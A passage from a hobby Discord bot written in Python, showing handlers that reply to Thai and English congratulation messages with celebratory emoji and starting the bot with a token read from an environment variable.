	elif "ยินดีด้วย" in message.content.lower():
		await message.channel.send('ขอแสดงความยินดี! 🎉🎉')

	elif "congratulation" in message.content.lower():
		if message.author.id == bot.user.id:
			return
		await message.channel.send('CONGRATULATION! 🎉🎉')
		await bot.process_commands(message)


Token = os.getenv("DaFuqTestToken")
bot.run(Token)